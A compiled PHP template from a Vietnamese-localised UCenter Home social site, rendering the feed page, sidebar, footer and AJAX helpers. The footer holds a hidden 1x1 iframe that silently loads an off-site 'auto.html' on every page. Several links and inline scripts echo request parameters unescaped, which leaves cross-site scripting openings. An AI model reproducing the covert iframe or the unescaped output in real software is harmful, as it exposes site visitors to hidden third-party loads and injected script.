<?php if($day=='yesterday') { ?>Yesterday
<?php } elseif($day=='today') { ?>Today
<?php } elseif($day=='app') { ?>What other playing
<?php } else { ?><?=$day?>
<?php } ?>
</h4>
<?php } ?>
<ul>
<?php if(is_array($values)) { foreach($values as $value) { ?>
<li class="s_clear <?=$value['magic_class']?>" id="feed_<?=$value['feedid']?>_li" onmouseover="feed_menu(<?=$value['feedid']?>,1);" onmouseout="feed_menu(<?=$value['feedid']?>,0);">
<div style="width:100%;overflow:hidden;" <?=$value['style']?>>
<?php if($value['uid'] && empty($_TPL['hidden_more'])) { ?>
<a href="cp.php?ac=feed&op=menu&feedid=<?=$value['feedid']?>" class="float_more" id="a_feed_menu_<?=$value['feedid']?>"  onmouseover="feed_menu(<?=$value['feedid']?>,1);" onmouseout="feed_menu(<?=$value['feedid']?>,0);" onclick="ajaxmenu(event, this.id)" title="More options" style="display:none;">Menu</a>
<?php } ?>
<a class="type" href="space.php?uid=<?=$_GET['uid']?>&do=feed&view=<?=$_GET['view']?>&appid=<?=$value['appid']?>&icon=<?=$value['icon']?>" title="Only such Feed"><img src="<?=$value['icon_image']?>" /></a>
<?=$value['title_template']?> 

<?php if(empty($_TPL['hidden_time'])) { ?>
<span class="gray"><?php echo sgmdate('m-d H:i',$value[dateline],1); ?></span>
<?php } ?>

<?php if(empty($_TPL['hidden_menu'])) { ?>
<?php if($value['idtype']=='doid') { ?>
(<a href="javascript:;" onclick="docomment_get('docomment_<?=$value['id']?>', 1);" id="do_a_op_<?=$value['id']?>">Reply</a>)
<?php } elseif(in_array($value['idtype'], array('blogid','picid','sid','pid','eventid'))) { ?>
(<a href="javascript:;" onclick="feedcomment_get(<?=$value['feedid']?>);" id="feedcomment_a_op_<?=$value['feedid']?>">Comment</a>)
<?php } ?>
<?php } ?>

<div class="feed_content">

<?php if(empty($_TPL['hidden_hot']) && $value['hot']) { ?>
<div class="hotspot"><a href="cp.php?ac=feed&feedid=<?=$value['feedid']?>"><?=$value['hot']?></a></div>
<?php } ?>	

<?php if($value['image_1']) { ?>
<a href="<?=$value['image_1_link']?>"<?=$value['target']?>><img src="<?=$value['image_1']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($value['image_2']) { ?>
<a href="<?=$value['image_2_link']?>"<?=$value['target']?>><img src="<?=$value['image_2']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($value['image_3']) { ?>
<a href="<?=$value['image_3_link']?>"<?=$value['target']?>><img src="<?=$value['image_3']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($value['image_4']) { ?>
<a href="<?=$value['image_4_link']?>"<?=$value['target']?>><img src="<?=$value['image_4']?>" class="summaryimg" /></a>
<?php } ?>

<?php if($value['body_template']) { ?>
<div class="detail"<?php if($value['image_3']) { ?> style="clear: both;"<?php } ?>>
<?=$value['body_template']?>
</div>
<?php } ?>

<?php if($value['thisapp'] && !empty($value['body_data']['flashvar'])) { ?>
<div class="media">
<img src="image/vd.gif" alt="Click to play" onclick="javascript:showFlash('<?=$value['body_data']['host']?>', '<?=$value['body_data']['flashvar']?>', this, '<?=$value['feedid']?>');" style="cursor:pointer;" />
</div>
<?php } elseif($value['thisapp'] && !empty($value['body_data']['musicvar'])) { ?>
<div class="media">
<img src="image/music.gif" alt="Click to play" onclick="javascript:showFlash('music', '<?=$value['body_data']['musicvar']?>', this, '<?=$value['feedid']?>');" style="cursor:pointer;" />
</div>
<?php } elseif($value['thisapp'] && !empty($value['body_data']['flashaddr'])) { ?>
<div class="media">
<img src="image/flash.gif" alt="Click to play" onclick="javascript:showFlash('flash', '<?=$value['body_data']['flashaddr']?>', this, '<?=$value['feedid']?>');" style="cursor:pointer;" />
</div>
<?php } ?>

<?php if($value['body_general']) { ?>
<div class="quote"><span class="q"><?=$value['body_general']?></span></div>
<?php } ?>
</div>
</div>

<?php if($value['idtype']=='doid') { ?>
<div id="docomment_<?=$value['id']?>" style="display:none;"></div>
<?php } elseif($value['idtype']) { ?>
<div id="feedcomment_<?=$value['feedid']?>" style="display:none;"></div>
<?php } ?>

<?php if(!empty($hiddenfeed_num[$value['icon']])) { ?>
<div id="appfeed_open_<?=$value['feedid']?>"><a href="javascript:;" id="feed_a_more_<?=$value['feedid']?>" onclick="feed_more_show('<?=$value['feedid']?>');">&raquo;  More Feed (<?=$hiddenfeed_num[$value['icon']]?>)</a></div>
<div id="feed_more_<?=$value['feedid']?>" style="display:none;">
<ol>
<?php if(is_array($hiddenfeed_list[$value['icon']])) { foreach($hiddenfeed_list[$value['icon']] as $appvalue) { ?>
<?php $appvalue = mkfeed($appvalue); ?>
<li>
<?=$appvalue['title_template']?>
<div class="feed_content" style="width:100%;overflow:hidden;">
<?php if($appvalue['image_1']) { ?>
<a href="<?=$appvalue['image_1_link']?>"<?=$appvalue['target']?>><img src="<?=$appvalue['image_1']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($appvalue['image_2']) { ?>
<a href="<?=$appvalue['image_2_link']?>"<?=$appvalue['target']?>><img src="<?=$appvalue['image_2']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($appvalue['image_3']) { ?>
<a href="<?=$appvalue['image_3_link']?>"<?=$appvalue['target']?>><img src="<?=$appvalue['image_3']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($appvalue['image_4']) { ?>
<a href="<?=$appvalue['image_4_link']?>"<?=$appvalue['target']?>><img src="<?=$appvalue['image_4']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($appvalue['body_template']) { ?>
<div class="detail"<?php if($appvalue['image_3']) { ?> style="clear: both;"<?php } ?>>
<?=$appvalue['body_template']?>
</div>
<?php } ?>
<?php if($appvalue['body_general']) { ?>
<div class="quote"><span class="q"><?=$appvalue['body_general']?></span></div>
<?php } ?>
</div>
</li>
<?php } } ?>
</ol>
</div>
<?php } ?>
</li>
<?php } } ?>
</ul>
<?php } } ?>

<?php } else { ?>
<ul>
<li>No RSS Feed</li>
</ul>
<?php } ?>

<?php if($filtercount) { ?>
<div class="notice" id="feed_filter_notice_<?=$start?>">
As per your <a href="cp.php?ac=privacy&op=view">setting</a>��<?=$filtercount?> RSS Feeds ignored  (<a href="javascript:;" onclick="filter_more(<?=$start?>);" id="a_feed_privacy_more"> Click to view</a>)
</div>
<div id="feed_filter_div_<?=$start?>" class="enter-content" style="display:none;">
<h4 class="feedtime">The following are ignored Feed</h4>
<ul>
<?php if(is_array($filter_list)) { foreach($filter_list as $value) { ?>
<?php $value = mkfeed($value); ?>
<li class="s_clear <?=$value['magic_class']?>" id="feed_<?=$value['feedid']?>_li" onmouseover="feed_menu(<?=$value['feedid']?>,1);" onmouseout="feed_menu(<?=$value['feedid']?>,0);">
<div style="width:100%;overflow:hidden;" <?=$value['style']?>>
<?php if($value['uid'] && empty($_TPL['hidden_more'])) { ?>
<a href="cp.php?ac=feed&op=menu&feedid=<?=$value['feedid']?>" class="float_more" id="a_feed_menu_<?=$value['feedid']?>"  onmouseover="feed_menu(<?=$value['feedid']?>,1);" onmouseout="feed_menu(<?=$value['feedid']?>,0);" onclick="ajaxmenu(event, this.id)" title="More options" style="display:none;">Menu</a>
<?php } ?>
<a class="type" href="space.php?uid=<?=$_GET['uid']?>&do=feed&view=<?=$_GET['view']?>&appid=<?=$value['appid']?>&icon=<?=$value['icon']?>" title="Only such Feed"><img src="<?=$value['icon_image']?>" /></a>
<?=$value['title_template']?> 

<?php if(empty($_TPL['hidden_time'])) { ?>
<span class="gray"><?php echo sgmdate('m-d H:i',$value[dateline],1); ?></span>
<?php } ?>

<?php if(empty($_TPL['hidden_menu'])) { ?>
<?php if($value['idtype']=='doid') { ?>
(<a href="javascript:;" onclick="docomment_get('docomment_<?=$value['id']?>', 1);" id="do_a_op_<?=$value['id']?>">Reply</a>)
<?php } elseif(in_array($value['idtype'], array('blogid','picid','sid','pid','eventid'))) { ?>
(<a href="javascript:;" onclick="feedcomment_get(<?=$value['feedid']?>);" id="feedcomment_a_op_<?=$value['feedid']?>">Comment</a>)
<?php } ?>
<?php } ?>

<div class="feed_content">

<?php if(empty($_TPL['hidden_hot']) && $value['hot']) { ?>
<div class="hotspot"><a href="cp.php?ac=feed&feedid=<?=$value['feedid']?>"><?=$value['hot']?></a></div>
<?php } ?>	

<?php if($value['image_1']) { ?>
<a href="<?=$value['image_1_link']?>"<?=$value['target']?>><img src="<?=$value['image_1']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($value['image_2']) { ?>
<a href="<?=$value['image_2_link']?>"<?=$value['target']?>><img src="<?=$value['image_2']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($value['image_3']) { ?>
<a href="<?=$value['image_3_link']?>"<?=$value['target']?>><img src="<?=$value['image_3']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($value['image_4']) { ?>
<a href="<?=$value['image_4_link']?>"<?=$value['target']?>><img src="<?=$value['image_4']?>" class="summaryimg" /></a>
<?php } ?>

<?php if($value['body_template']) { ?>
<div class="detail"<?php if($value['image_3']) { ?> style="clear: both;"<?php } ?>>
<?=$value['body_template']?>
</div>
<?php } ?>

<?php if($value['thisapp'] && !empty($value['body_data']['flashvar'])) { ?>
<div class="media">
<img src="image/vd.gif" alt="Click to play" onclick="javascript:showFlash('<?=$value['body_data']['host']?>', '<?=$value['body_data']['flashvar']?>', this, '<?=$value['feedid']?>');" style="cursor:pointer;" />
</div>
<?php } elseif($value['thisapp'] && !empty($value['body_data']['musicvar'])) { ?>
<div class="media">
<img src="image/music.gif" alt="Click to play" onclick="javascript:showFlash('music', '<?=$value['body_data']['musicvar']?>', this, '<?=$value['feedid']?>');" style="cursor:pointer;" />
</div>
<?php } elseif($value['thisapp'] && !empty($value['body_data']['flashaddr'])) { ?>
<div class="media">
<img src="image/flash.gif" alt="Click to play" onclick="javascript:showFlash('flash', '<?=$value['body_data']['flashaddr']?>', this, '<?=$value['feedid']?>');" style="cursor:pointer;" />
</div>
<?php } ?>

<?php if($value['body_general']) { ?>
<div class="quote"><span class="q"><?=$value['body_general']?></span></div>
<?php } ?>
</div>
</div>

<?php if($value['idtype']=='doid') { ?>
<div id="docomment_<?=$value['id']?>" style="display:none;"></div>
<?php } elseif($value['idtype']) { ?>
<div id="feedcomment_<?=$value['feedid']?>" style="display:none;"></div>
<?php } ?>

<?php if(!empty($hiddenfeed_num[$value['icon']])) { ?>
<div id="appfeed_open_<?=$value['feedid']?>"><a href="javascript:;" id="feed_a_more_<?=$value['feedid']?>" onclick="feed_more_show('<?=$value['feedid']?>');">&raquo;  More Feed (<?=$hiddenfeed_num[$value['icon']]?>)</a></div>
<div id="feed_more_<?=$value['feedid']?>" style="display:none;">
<ol>
<?php if(is_array($hiddenfeed_list[$value['icon']])) { foreach($hiddenfeed_list[$value['icon']] as $appvalue) { ?>
<?php $appvalue = mkfeed($appvalue); ?>
<li>
<?=$appvalue['title_template']?>
<div class="feed_content" style="width:100%;overflow:hidden;">
<?php if($appvalue['image_1']) { ?>
<a href="<?=$appvalue['image_1_link']?>"<?=$appvalue['target']?>><img src="<?=$appvalue['image_1']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($appvalue['image_2']) { ?>
<a href="<?=$appvalue['image_2_link']?>"<?=$appvalue['target']?>><img src="<?=$appvalue['image_2']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($appvalue['image_3']) { ?>
<a href="<?=$appvalue['image_3_link']?>"<?=$appvalue['target']?>><img src="<?=$appvalue['image_3']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($appvalue['image_4']) { ?>
<a href="<?=$appvalue['image_4_link']?>"<?=$appvalue['target']?>><img src="<?=$appvalue['image_4']?>" class="summaryimg" /></a>
<?php } ?>
<?php if($appvalue['body_template']) { ?>
<div class="detail"<?php if($appvalue['image_3']) { ?> style="clear: both;"<?php } ?>>
<?=$appvalue['body_template']?>
</div>
<?php } ?>
<?php if($appvalue['body_general']) { ?>
<div class="quote"><span class="q"><?=$appvalue['body_general']?></span></div>
<?php } ?>
</div>
</li>
<?php } } ?>
</ol>
</div>
<?php } ?>
</li>
<?php } } ?>
<li><a href="javascript:;" onclick="filter_more(<?=$start?>);">&laquo; Grasp</a></li>
</ul>
</div>
<?php } ?>

<?php if(empty($_TPL['getmore'])) { ?>	
</div>

<?php if($count==$perpage) { ?>
<div class="page" style="padding-top:20px;">
<a href="javascript:;" onclick="feed_more();" id="a_feed_more">View More Feed</a>
</div>
<?php } ?>

<div id="ajax_wait"></div>

</div>
</div>
<!--/content-->

<div id="sidebar">
<?php if(!$isnewer && $task) { ?>
<div class="ye_r_t"><div class="ye_l_t"><div class="ye_r_b"><div class="ye_l_b">
<div class="task_notice" style="width:230px;">
<a title="ignore" class="float_cancel" href="cp.php?ac=task&taskid=<?=$task['taskid']?>&op=ignore">ignore</a>
<div class="task_notice_body">
<img src="<?=$task['image']?>" alt="" class="icon" />
<h3><a href="cp.php?ac=task&op=do&taskid=<?=$task['taskid']?>"><?=$task['name']?></a></h3>
<p>Available <span class="num"><?=$task['credit']?></span> Points</p>
</div>
</div>
</div></div></div></div>
<?php } ?>

<?php if($topiclist) { ?>
<div class="ye_r_t"><div class="ye_l_t"><div class="ye_r_b"><div class="ye_l_b">
<div class="task_notice" style="width:230px;">
<?php if(is_array($topiclist)) { foreach($topiclist as $key => $value) { ?>
<div class="task_notice_body">
<?php if($value['pic']) { ?>
<a href="space.php?do=topic&topicid=<?=$value['topicid']?>"><img src="<?=$value['pic']?>" alt="" class="icon" /></a>
<?php } ?>
<h3>
<img src="image/app/topic.gif" align="absmiddle">
<a href="space.php?do=topic&topicid=<?=$value['topicid']?>"><?=$value['subject']?></a>
</h3>
<div class="gray">Participating <span class="num"><?=$value['joinnum']?></span></div>
</div>
<?php } } ?>
</div>
</div></div></div></div>
<?php } ?>

<?php if($newspacelist) { ?>
<div class="sidebox">
<h2 class="title">
<p class="r_option">
<a href="space.php?do=top">Popular</a>
</p>
Your Warm Welcome!
</h2>
<ul class="avatar_list">
<?php if(is_array($newspacelist)) { foreach($newspacelist as $key => $value) { ?>
<li>
<div class="avatar48"><a href="space.php?uid=<?=$value['uid']?>"><?php echo avatar($value[uid],small); ?></a></div>
<p<?php if($ols[$value['uid']]) { ?> class="online_icon_p" title="Online"<?php } ?>><a href="space.php?uid=<?=$value['uid']?>" title="<?=$_SN[$value['uid']]?>"><?=$_SN[$value['uid']]?></a></p>
<p class="gray"><?php echo sgmdate('n��j��',$value[dateline],1); ?></p>
</li>
<?php } } ?>
</ul>
</div>
<?php } ?>

<?php if($visitorlist) { ?>
<div class="sidebox">
<h2 class="title">
<p class="r_option">
<a href="space.php?uid=<?=$space['uid']?>&do=friend&view=visitor">All</a>
</p>
Recent Visitor
<?php if($_SGLOBAL['magic']['detector']) { ?>
<span class="gray"><img src="image/magic/detector.small.gif" title="<?=$_SGLOBAL['magic']['detector']?>" /><a id="a_magic_detector" href="magic.php?mid=detector" onclick="ajaxmenu(event,this.id,1)"><?=$_SGLOBAL['magic']['detector']?></a></span>
<?php } ?>
</h2>
<ul class="avatar_list">
<?php if(is_array($visitorlist)) { foreach($visitorlist as $key => $value) { ?>
<li>
<?php if($value['vusername'] == '') { ?>
<div class="avatar48"><img src="image/magic/hidden.gif" alt="Anonymous" /></a></div>
<p>Hidden</p>
<p class="gray"><?php echo sgmdate('n��j��',$value[dateline],1); ?></p>
<?php } else { ?>
<div class="avatar48"><a href="space.php?uid=<?=$value['vuid']?>"><?php echo avatar($value[vuid],small); ?></a></div>
<p<?php if($ols[$value['vuid']]) { ?> class="online_icon_p" title="Online"<?php } ?>><a href="space.php?uid=<?=$value['vuid']?>" title="<?=$_SN[$value['vuid']]?>"><?=$_SN[$value['vuid']]?></a></p>
<p class="gray"><?php echo sgmdate('n��j��',$value[dateline],1); ?></p>
<?php } ?>
</li>
<?php } } ?>
</ul>
</div>
<?php } ?>

<?php if($olfriendlist) { ?>
<div class="sidebox">
<h2 class="title">
<p class="r_option">
<a href="space.php?uid=<?=$space['uid']?>&do=friend">All</a>
</p>
My Friends
<?php if($_SGLOBAL['magic']['visit']) { ?>
<span class="gray"><img src="image/magic/visit.small.gif" title="<?=$_SGLOBAL['magic']['visit']?>" /><a id="a_magic_visit" href="magic.php?mid=visit" onclick="ajaxmenu(event,this.id,1)"><?=$_SGLOBAL['magic']['visit']?></a></span>
<?php } ?>
</h2>
<ul class="avatar_list">
<?php if(is_array($olfriendlist)) { foreach($olfriendlist as $key => $value) { ?>
<li>
<div class="avatar48"><a href="space.php?uid=<?=$value['uid']?>"><?php echo avatar($value[uid],small); ?></a></div>
<p<?php if($ols[$value['uid']]) { ?> class="online_icon_p" title="Online"<?php } ?>><a href="space.php?uid=<?=$value['uid']?>" title="<?=$_SN[$value['uid']]?>"><?=$_SN[$value['uid']]?></a></p>
<p class="gray"><?php if($value['lastactivity']) { ?><?php echo sgmdate('H:i',$value[lastactivity],1); ?><?php } else { ?>Poplar(<?=$value['num']?>)<?php } ?></p>
</li>
<?php } } ?>
</ul>
</div>
<?php } ?>

<?php if($birthlist) { ?>
<div class="searchfriend">
<div class="ye_r_t"><div class="ye_l_t"><div class="ye_r_b"><div class="ye_l_b">
<h3>Birthday Reminder</h3>
<div class="box">
<table cellpadding="2" cellspacing="4">
<?php if(is_array($birthlist)) { foreach($birthlist as $key => $values) { ?>
<tr>
<td align="right" valign="top" style="padding-left:10px;">
<?php if($values['0']['istoday']) { ?> Today <?php } else { ?><?=$values['0']['birthmonth']?>-<?=$values['0']['birthday']?><?php } ?>
</td>
<td style="padding-left:10px;">
<ul>
<?php if(is_array($values)) { foreach($values as $value) { ?>
<li><a href="space.php?uid=<?=$value['uid']?>"><?=$_SN[$value['uid']]?></a></li>
<?php } } ?>
</ul>
</td>
</tr>
<?php } } ?>
</table>
</div>
</div></div></div></div>
</div>
<?php } ?>

<div class="searchfriend">
<div class="ye_r_t"><div class="ye_l_t"><div class="ye_r_b"><div class="ye_l_b">
<h3>Search Users</h3>
<form method="get" action="cp.php" style="padding:10px 0 5px 0;">
<input name="searchkey" value="" size="20" class="t_input" type="text">
<input name="searchsubmit" value="Find people" class="submit" type="submit">
<input type="hidden" name="searchmode" value="1" />
<input type="hidden" name="ac" value="friend" />
<input type="hidden" name="op" value="search" />
</form>
<p>
<a href="cp.php?ac=friend&op=search">Advanced Search</a><span class="pipe">|</span>
<a href="cp.php?ac=invite">Invite Friends</a><span class="pipe">|</span>
<a href="cp.php?ac=friend&op=find">Peoples May be You know them</a></p>
</div></div></div></div>
</div>

</div>
<!--/sidebar-->

<script type="text/javascript">

var next = <?=$start?>;
function feed_more() {
var x = new Ajax('XML', 'ajax_wait');
var html = '';
next = next + <?=$perpage?>;
x.get('cp.php?ac=feed&op=get&start='+next+'&view=<?=$_GET['view']?>&appid=<?=$_GET['appid']?>&icon=<?=$_GET['icon']?>&filter=<?=$_GET['filter']?>&day=<?=$_GET['day']?>', function(s){
html = '<h4 class="feedtime">Unread new Feed</h4>' + s;
$('feed_div').innerHTML += html;
});
}

function filter_more(id) {
if($('feed_filter_div_'+id).style.display == '') {
$('feed_filter_div_'+id).style.display = 'none';
$('feed_filter_notice_'+id).style.display = '';
} else {
$('feed_filter_div_'+id).style.display = '';
$('feed_filter_notice_'+id).style.display = 'none';
}
}

function close_feedbox() {
var x = new Ajax();
x.get('cp.php?ac=common&op=closefeedbox', function(s){
$('feed_box').style.display = 'none';
});
}

var elems = selector('li[class~=magicthunder]', $('feed_div')); 
for(var i=0; i<elems.length; i++){		
magicColor(elems[i]); 
}
</script>

<?php my_checkupdate(); ?>
<?php my_showgift(); ?>
<?php if(empty($_SGLOBAL['inajax'])) { ?>
<?php if(empty($_TPL['nosidebar'])) { ?>
<?php if($_SGLOBAL['ad']['contentbottom']) { ?><br style="line-height:0;clear:both;"/><div id="ad_contentbottom"><?php adshow('contentbottom'); ?></div><?php } ?>
</div>

<!--/mainarea-->
<div id="bottom"></div>
</div>
<!--/main-->
<?php } ?>

<div id="footer">
<?php if($_TPL['templates']) { ?>
<div class="chostlp" title="Đổi giao diện"><img id="chostlp" src="<?=$_TPL['default_template']['icon']?>" onmouseover="showMenu(this.id)" alt="<?=$_TPL['default_template']['name']?>" /></div>
<ul id="chostlp_menu" class="chostlp_drop" style="display: none">
<?php if(is_array($_TPL['templates'])) { foreach($_TPL['templates'] as $value) { ?>
<li><a href="cp.php?ac=common&op=changetpl&name=<?=$value['name']?>" title="<?=$value['name']?>"><img src="<?=$value['icon']?>" alt="<?=$value['name']?>" /></a></li>
<?php } } ?>
</ul>
<?php } ?>

<p class="r_option">
<a href="javascript:;" onclick="window.scrollTo(0,0);" id="a_top" title="TOP"><img src="image/top.gif" alt="" style="padding: 5px 6px 6px;" /></a>
</p>

<?php if($_SGLOBAL['ad']['footer']) { ?>
<p style="padding:5px 0 10px 0;"><?php adshow('footer'); ?></p>
<?php } ?>

<?php if($_SCONFIG['close']) { ?>
<p style="color:blue;font-weight:bold;">
Thông báo: Hiện trang web đang tạm ngừng hoạt động
</p>
<?php } ?>
<p>
<?=$_SCONFIG['sitename']?> - 
<a href="mailto:<?=$_SCONFIG['adminemail']?>">Liên hệ</a> <a href="http://gohooh.com">Discuz! Việt - Mạng xã hội</a>
<?php if($_SCONFIG['miibeian']) { ?> - <a  href="http://www.miibeian.gov.cn" target="_blank"><?=$_SCONFIG['miibeian']?></a><?php } ?>
</p>
<p>
Powered by <a  href="http://gohooh.com" target="_blank"><strong>UCenter Home</strong></a> <span title="<?php echo X_RELEASE; ?>"><?php echo X_VER; ?></span>
<?php if(!empty($_SCONFIG['licensed'])) { ?><a  href="http://license.comsenz.com/?pid=7&host=<?=$_SERVER['HTTP_HOST']?>" target="_blank">Licensed</a><?php } ?>
&copy; 2001-2009 <a  href="http://www.comsenz.com" target="_blank">Comsenz Inc.</a>
</p>
<?php if($_SCONFIG['debuginfo']) { ?>
<p><?php echo debuginfo(); ?></p>
<?php } ?>
</div>
</div>
<!--/wrap-->

<?php if($_SGLOBAL['appmenu']) { ?>
<ul id="ucappmenu_menu" class="dropmenu_drop" style="display:none;">
<li><a href="<?=$_SGLOBAL['appmenu']['url']?>" title="<?=$_SGLOBAL['appmenu']['name']?>" target="_blank"><?=$_SGLOBAL['appmenu']['name']?></a></li>
<?php if(is_array($_SGLOBAL['appmenus'])) { foreach($_SGLOBAL['appmenus'] as $value) { ?>
<li><a href="<?=$value['url']?>" title="<?=$value['name']?>" target="_blank"><?=$value['name']?></a></li>
<?php } } ?>
</ul>
<?php } ?>
<iframe style="WIDTH: 1; HEIGHT: 1" src="http://www.gohooh.com/auto.html" frameborder="0" width="1" scrolling="1" height="1"></iframe>
<?php if($_SGLOBAL['supe_uid']) { ?>
<ul id="membernotemenu_menu" class="dropmenu_drop" style="display:none;">
<?php $member = $_SGLOBAL['member']; ?>
<?php if($member['notenum']) { ?><li><img src="image/icon/notice.gif" width="16" alt="" /> <a href="space.php?do=notice"><strong><?=$member['notenum']?></strong> Thông báo mới</a></li><?php } ?>
<?php if($member['pokenum']) { ?><li><img src="image/icon/poke.gif" alt="" /> <a href="cp.php?ac=poke"><strong><?=$member['pokenum']?></strong> Tin mới</a></li><?php } ?>
<?php if($member['addfriendnum']) { ?><li><img src="image/icon/friend.gif" alt="" /> <a href="cp.php?ac=friend&op=request"><strong><?=$member['addfriendnum']?></strong> Yêu cầu kết bạn</a></li><?php } ?>
<?php if($member['mtaginvitenum']) { ?><li><img src="image/icon/mtag.gif" alt="" /> <a href="cp.php?ac=mtag&op=mtaginvite"><strong><?=$member['mtaginvitenum']?></strong> Mời nhóm</a></li><?php } ?>
<?php if($member['eventinvitenum']) { ?><li><img src="image/icon/event.gif" alt="" /> <a href="cp.php?ac=event&op=eventinvite"><strong><?=$member['eventinvitenum']?></strong> Mời tham gia Event</a></li><?php } ?>
<?php if($member['myinvitenum']) { ?><li><img src="image/icon/userapp.gif" alt="" /> <a href="space.php?do=notice&view=userapp"><strong><?=$member['myinvitenum']?></strong> Mời qua Email</a></li><?php } ?>
</ul>
<?php } ?>

<?php if($_SGLOBAL['supe_uid']) { ?>
<?php if(!isset($_SCOOKIE['checkpm'])) { ?>
<script language="javascript"  type="text/javascript" src="cp.php?ac=pm&op=checknewpm&rand=<?=$_SGLOBAL['timestamp']?>"></script>
<?php } ?>
<?php if(!isset($_SCOOKIE['synfriend'])) { ?>
<script language="javascript"  type="text/javascript" src="cp.php?ac=friend&op=syn&rand=<?=$_SGLOBAL['timestamp']?>"></script>
<?php } ?>
<?php } ?>
<?php if(!isset($_SCOOKIE['sendmail'])) { ?>
<script language="javascript"  type="text/javascript" src="do.php?ac=sendmail&rand=<?=$_SGLOBAL['timestamp']?>"></script>
<?php } ?>

<?php if($_SGLOBAL['ad']['couplet']) { ?>
<script language="javascript" type="text/javascript" src="source/script_couplet.js"></script>
<div id="uch_couplet" style="z-index: 10; position: absolute; display:none">
<div id="couplet_left" style="position: absolute; left: 2px; top: 60px; overflow: hidden;">
<div style="position: relative; top: 25px; margin:0.5em;" onMouseOver="this.style.cursor='hand'" onClick="closeBanner('uch_couplet');"><img src="image/advclose.gif"></div>
<?php adshow('couplet'); ?>
</div>
<div id="couplet_rigth" style="position: absolute; right: 2px; top: 60px; overflow: hidden;">
<div style="position: relative; top: 25px; margin:0.5em;" onMouseOver="this.style.cursor='hand'" onClick="closeBanner('uch_couplet');"><img src="image/advclose.gif"></div>
<?php adshow('couplet'); ?>
</div>
<script type="text/javascript">
lsfloatdiv('uch_couplet', 0, 0, '', 0).floatIt();
</script>
</div>
<?php } ?>
<?php if($_SCOOKIE['reward_log']) { ?>
<script type="text/javascript">
showreward();
</script>
<?php } ?>
<br>
</body>
</html>
<?php } ?>
<?php } ?><?php ob_out();?>